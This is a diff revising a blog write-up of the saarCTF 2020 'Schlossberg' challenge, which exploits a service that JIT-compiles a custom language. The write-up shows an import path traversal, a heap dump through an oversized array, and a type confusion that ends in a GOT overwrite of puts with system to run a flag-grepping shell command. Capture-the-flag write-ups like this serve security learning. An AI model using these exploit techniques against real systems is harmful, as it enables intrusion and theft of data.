@@ -21,15 +21,16 @@ I mirrored the challenge files [here](/assets/ctf/saarctf20/schlossberg.tar.gz).
 ### Overview
 
 The challenge shipped with several cave templates.
-A user can build a cave from an existing template and populate it with treasures in random positions, which are flags for caves created by the gamebot.
+A user can build a cave from an existing template and populate it with treasures in random positions.
+For caves created by the gamebot, the treasures are flags.
 Any user can visit a cave by providing a program written in a custom programming language.
 The program has to navigate around the cave.
 If it terminates on a treasure, the treasure's contents will be printed.
 
 I was drawn to this challenge because the custom programming language is compiled to machine code using LLVM, and then executed.
-It looked like a fun place to look for bugs.
+It seemed like a fun place to look for bugs.
 
-The challenge ships the backend's source code, in `backend/src`, some program samples, in `backend/samples`, and the prebuilt binaries in `backend/build`.
+The challenge ships the backend's source code in `backend/src`, some program samples in `backend/samples`, and the prebuilt binaries in `backend/build`.
 The `backend/build/SaarlangCompiler` executable is a standalone compiler for the language.
 It's useful for testing, but it is not used in the challenge.
 The actual server is `backend/build/SchlossbergCaveServer`.
@@ -39,35 +40,82 @@ I will use port 9081 in examples and exploits so that they can be tested locally
 ### API interactions
 
 The APIs are defined in `backend/src/api.cpp`.
-We will take a look at a typical bot interaction.
+We will take a look at some typical API interactions.
+I will prettify JSON responses for your convenience.
 
 First, we need to register a user:
 
 ```
-$ curl -c cookies -X POST -H 'Content-Type: application/json' -d '{"username": "abiondo", "password": "secret"}' http://localhost:9081/api/users/register
-{"username":"abiondo"}
+$ curl -c cookies -X POST -H 'Content-Type: application/json' \
+       -d '{"username": "abiondo", "password": "secret"}'     \
+       http://localhost:9081/api/users/register
+{
+    "username": "abiondo"
+}
 ```
 
 This will automatically log us in (there's a `/api/users/login` endpoint for that, too).
 Now we can create a new cave from a cave template:
 
 ```
-$ curl -b cookies -X POST -H 'Content-Type: application/json' -d '{"name": "MyFancyCave", "template": 1}' http://localhost:9081/api/caves/rent
-{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":0,"treasures":[]}
+$ curl -b cookies -X POST -H 'Content-Type: application/json' \
+       -d '{"name": "MyFancyCave", "template": 1}'            \
+       http://localhost:9081/api/caves/rent
+{
+    "created": 1584867401,
+    "id": "1584867401_1345632849",
+    "name": "MyFancyCave",
+    "owner": "abiondo",
+    "template_id": 1,
+    "treasure_count": 0,
+    "treasures": []
+}
 ```
 
 And add a couple treasures (flags) to the cave in random positions:
 
 ```
-$ curl -b cookies -X POST -H 'Content-Type: application/json' -d '{"cave_id": "1584867401_1345632849", "names": ["SAAR{OneFancyFlagOneFancyFlag00000000}", "SAAR{TwoFancyFlagsTwoFancyFlags000000}"]}' http://localhost:9081/api/caves/hide-treasures
-{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":2,"treasures":[{"name":"SAAR{OneFancyFlagOneFancyFlag00000000}","x":645,"y":97},{"name":"SAAR{TwoFancyFlagsTwoFancyFlags000000}","x":505,"y":14}]}
+$ curl -b cookies -X POST -H 'Content-Type: application/json' \
+       -d '{"cave_id": "1584867401_1345632849", "names": [    \
+                "SAAR{OneFancyFlagOneFancyFlag00000000}",     \
+                "SAAR{TwoFancyFlagsTwoFancyFlags000000}"]}'   \
+       http://localhost:9081/api/caves/hide-treasures
+{
+    "created": 1584867401,
+    "id": "1584867401_1345632849",
+    "name": "MyFancyCave",
+    "owner": "abiondo",
+    "template_id": 1,
+    "treasure_count": 2,
+    "treasures": [
+        {
+            "name": "SAAR{OneFancyFlagOneFancyFlag00000000}",
+            "x": 645,
+            "y": 97
+        },
+        {
+            "name": "SAAR{TwoFancyFlagsTwoFancyFlags000000}",
+            "x": 505,
+            "y": 14
+        }
+    ]
+}
 ```
 
 We can also list all existing caves without authentication:
 
 ```
 $ curl -X GET http://localhost:9081/api/caves/list
-[{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":2}]
+[
+    {
+        "created": 1584867401,
+        "id": "1584867401_1345632849",
+        "name": "MyFancyCave",
+        "owner": "abiondo",
+        "template_id": 1,
+        "treasure_count": 2
+    }
+]
 ```
 
 Next, we can visit the cave through the `/api/caves/visit` endpoint.
@@ -76,10 +124,10 @@ However, let's have a look at the custom programming language first.
 ### The language
 
 The language is custom, and gets compiled through the LLVM JIT.
-The typing system supports 64-bit integers (`int`), arrays of bytes (`lischd byte`), and arrays of 64-bit integer (`lischd int`).
+The typing system supports 64-bit integers (`int`), arrays of bytes (`lischd byte`), and arrays of 64-bit integers (`lischd int`).
 Other notable features are import statements (`holmol`), functions (declared with `eija`, called with `mach`), and various conditional structures.
 
-As you might have notice from the words, many keywords in this language are not English.
+As you might have noticed from the words, many keywords in this language are not English.
 Fortunately, internal token names from the lexer are much easier to understand (see `backend/src/saarlang/Lexer.h`):
 
 ```cpp
@@ -119,7 +167,10 @@ The function simply returns 1337.
 Now we can use the visit API to execute this program (saved as `1337.sl`) in our cave:
 
 ```
-$ curl -X POST -H 'Content-Type: application/json' -d '{"cave_id": "1584867401_1345632849", "files": {"1337.sl": "'"$(cat 1337.sl)"'"}}' http://localhost:9081/api/visit
+$ curl -X POST -H 'Content-Type: application/json'         \
+       -d '{"cave_id": "1584867401_1345632849", "files": { \
+                "1337.sl": "'"$(cat 1337.sl)"'"}}'         \
+       http://localhost:9081/api/visit
 CODE SIGNATURES: {"1337.sl":"c010f92f93aa49671552b9ed0112c1f1b0e36bb62ca2149226ed6f761dc875f7"}
 --- Saarlang execution starts ---
 Result: 1337
@@ -145,7 +196,7 @@ Result: 1337
 ### Bug 1: path traversal in import statements
 
 The `holmol` statement allows to import definitions from other files.
-This is used to declare function exported by the language runtime, which provide I/O and cave movement.
+This is used to declare functions exported by the language runtime, which provide I/O and cave navigation functionality.
 These libraries can be found in `backend/include`.
 
 After the module that contains the `holmol` statement is parsed, the import resolution process kicks in (see `backend/src/saarlang/SaarlangModule.cpp`):
@@ -271,9 +322,10 @@ eija main() gebbtserick int: {
 We create an array `a` with a size of `(1 << 64) / 8`.
 Then, we loop with `j` from 0 to the size of `a` (the size operator is `grees`), and we print each element through the `sahmol_ln` function from the standard library, which prints an `int` followed by newline.
 In the exploit, we can read the quadwords printed by `sahmol_ln`, reconstruct the heap data, and scan for flags.
-Once we hit unmapped memory after the heap, this will crash with a segmentation fault, but we'll still get output from the server.
+Once we hit unmapped memory after the heap, this will crash with a segmentation fault, but we'll still get the preceding output from the server.
 Since it crashes while going forward (before wrapping around), it will only dump memory after the array allocation.
 I wrote another version that goes backwards, and will crash on unmapped memory before the heap, and used both (which one gets the flag depends on where the array gets allocated).
+The heap dump has to be repeated for each cave, as the heap will only contain treasures for the cave we are visiting.
 
 The problem is that this generates _a lot_ of network traffic, which in turn makes it slow since most vulnboxes don't have a huge bandwidth.
 Our A/D infrastructure sits on a very generous bandwidth, enough that we could just crank the parallelism knob and be done with it, but it would probably start looking like DoS.
@@ -394,12 +446,12 @@ eija sahmol_ln(x: int) gebbtserick int: {}
 
 The function is defined with an empty body.
 This works because, when a file is imported, all the symbols it declares are added to the global namespace, but they are not actually defined, and no code is generated for them.
-At linking phase, the symbol will be linked with the function exported by the runtime.
+At linking phase, the symbol will be linked to the function exported by the runtime.
 When we send both files to the server, however, code is generated for each file.
 The empty-body definition of `sahmol_ln` will produce a symbol that overrides the runtime export, turning it into a no-op.
 Therefore, we cannot use this trick to confuse the prototype of existing runtime functions.
 
-However, we can confuse prototypes of functions defined by ourselves, as long as split them in three files (confused declaration, definition and usage) and get the compilation order just right:
+However, we can confuse prototypes of functions defined by ourselves, as long as split them in three files (definition, confused declaration, and usage) and get the compilation order just right:
 
 ```
 $ cat z.sl
@@ -428,15 +480,15 @@ Result: 0
 VISITED PATH: {"path":[{"x":720,"y":450}],"treasures":[]}
 ```
 
-In `z.sl`, we define an identity function `foo`: it accept an integer and returns the integer, unchanged.
+In `z.sl`, we define an identity function `foo`: it accepts an integer and returns it unchanged.
 In `import.sl`, we define an empty-body `foo`, but this time it accepts an array, and returns an integer.
 Finally, in `entry.sl`, we call `foo` on an array and print the returned integer.
 The `exploit` script just makes the usual POST request for visit.
 
 What's happening here?
-We created a situation where `entry.sl` uses the prototype from `import.sl`, which accepts an array, but at link time the implementation from `z.sl` will be chosen.
+We created a situation where `entry.sl` uses the prototype from `import.sl`, which accepts an array, but the implementation from `z.sl` will be chosen at link time.
 This depends on the order in which files are compiled.
-The filenames are not random: they've been chosen so that, once the request JSON is decoded to C++ maps (where the iteration order depends on the key hash), the order will be correct.
+The filenames are not random: they've been chosen so that, once the request JSON is decoded to C++ maps (where the iteration order depends on key hashes), the order will be correct.
 
 Effectively, we're confusing a `lischd int` to an `int` to leak the array address.
 But we can do the opposite, and confuse an `int` to a `lischd int` (`z.sl` is unchanged):
@@ -457,8 +509,7 @@ $ ./exploit
 CODE SIGNATURES: {"entry.sl":"9f843d0683b423b90c204b2a76342978093b3dc9a14f53157a77af7d9a33254a","import.sl":"b0c61d26bf4541d2ef3c5812e5c3ac331c787ef1894e4eac083781bb7c7752b3","z.sl":"7f5c72fee8fe6324b9a6b34daf8bc0e3945456e19fc643605e51655fde01f6aa"}
 --- Saarlang execution starts ---
 
-$ dmesg | tail
-[...]
+$ dmesg | tail -n2
 [17200.393984] MHD-single[20251]: segfault at 41414141 ip 00007f3f698e501f sp 00007f3f655f1110 error 4
 [17200.393988] Code: 00 00 00 00 00 00 00 00 00 00 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 50 bf 41 41 41 41 e8 1b 00 00 00 48 89 04 24 <48> 83 38 00 74 0c 48 c7 40 08 d2 04 00 00 31 c0 59 c3 e8 06 00 00
 ```
@@ -466,20 +517,20 @@ $ dmesg | tail
 Now, we confused the integer 0x41414141 to an integer array, and crashed on exactly that address when trying to access it.
 Note that the crash does not happen in the actual element access, but in the bounds check before it, which accesses the `length` field at the beginning of `sl_array_int`.
 
-Confusing an integer to an array gives us arbitrary R/W capability.
+Confusing an integer to an array gives us arbitrary address read/write capability.
 By default, this binary is compiled without PIE and with partial RELRO.
 I noticed that the binary imports `system` (to run the compiled code under `prlimit`), and the `sahmol_as_str` standard library function is implemented as follows:
 
-```
+```cpp
 sl_int println_as_str(sl_array_byte *x) {
 	puts((char *) x->data);
 	return 0;
 }
 ```
 
-Therefore, we can achieve RCE easily by overwriting the `puts` GOT entry with the address of the `system` PLT entry, and then calling `sahmol_as_str` on a byte array containg an arbitrary shell command.
+Therefore, we can execute arbitrary commands easily by overwriting the `puts` GOT entry with the address of the `system` PLT entry, and then calling `sahmol_as_str` on a byte array containig an arbitrary shell command.
 We just have to make sure that the `length` field of the confused array overlaps something with a big enough value for the index we'll be using.
-For example, for the command `egrep -roh 'SAAR\{[A-Za-z0-9\-_]{32}\}' ../../data/caves`:
+For example, for the command `egrep -roh 'SAAR\{[A-Za-z0-9\-_]{32}\}' ../../data/caves` (`z.sl` and `import.sl` are unchanged):
 
 ```
 $ cat entry.sl
@@ -494,3 +545,5 @@ eija main() gebbtserick int: {
     mach sahmol_as_str(c);
 }
 ```
+
+That's RCE, folks!
